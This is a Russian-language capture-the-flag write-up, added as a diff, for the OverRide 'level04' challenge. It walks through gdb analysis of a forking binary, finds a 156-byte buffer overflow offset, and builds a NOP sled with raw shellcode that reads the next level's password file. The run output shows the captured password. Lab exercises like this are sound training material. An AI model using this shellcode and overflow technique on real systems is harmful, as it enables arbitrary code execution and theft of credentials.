@@ -1,0 +1,54 @@
+1) Если идти по родительскому процессу, то после 
+(gdb) si
+0x080486f2 in main ()
+Попадаем в функцию prog_timeout (), после чего программа завершается
+
+2) Если идти по процессу-потомку
+set follow-fork-mode child (установим, что будем дебажить child ветку)
+
+0x080486f4 <+44>:    rep stos %eax,%es:(%edi) #memset
+
+По адресу в edi memset то что лежит в eax (0)
+0x08048709 <+65>:    cmpl   $0x0,0xac(%esp) 
+0xac(%esp) лежит значение, которое вернул fork 
+(0 в случае child процесса и не 0, если родительский процесс)
+
+0x08048713 <+75>:    movl   $0x1,0x4(%esp)
+0x0804871b <+83>:    movl   $0x1,(%esp)
+=> 0x08048722 <+90>:    call   0x8048540 <prctl@plt> # prctl(1, 1)
+
+   0x08048727 <+95>:    movl   $0x0,0xc(%esp)
+   0x0804872f <+103>:   movl   $0x0,0x8(%esp)
+   0x08048737 <+111>:   movl   $0x0,0x4(%esp)
+   0x0804873f <+119>:   movl   $0x0,(%esp)
+   0x08048746 <+126>:   call   0x8048570 <ptrace@plt> #prctl(0, 0, 0, 0)
+
+Чтобы определить смещение
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
+Полученное смещение - 156.
+
+Поскольку нельзя использовать shellcode который вызывает exec (родительский процесс контролирует это, вызывая kill), будем использовать shellcode, который сразу прочтет содержимое файла /home/users/level05/.pass и выведет пароль
+http://shell-storm.org/shellcode/files/shellcode-73.php
+
+Необходимо подобрать нужное кол-во nop, т.к. адрес плавающий.
+
+export SC=`python -c 'print("\x90" * 100000 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass" )'`
+
+Адрес для перехода также выберем приблизительно в середине дорожки из nop.
+Для этого запустим программу из под gdb, установим child ветку
+Поставим брейкпоинт например после gets:
+(gdb) b *0x08048763
+
+Дойдя до брейкпоинта посмотрим стек:
+(gdb) x/1000s $esp
+Определим с какого адреса начинается shellcode
+
+0xfffed6fa:      "SC=\220\220\220\220\220\220\220\220\220\220..."
+
+Возьмем адрес с некоторым отступом от начала, например, 0xfffeffff 
+
+level04@OverRide:~$ python -c 'print("a" * 156 + "\xff\xff\xfe\xff")' | ./level04
+Give me some shellcode, k
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+child is exiting...
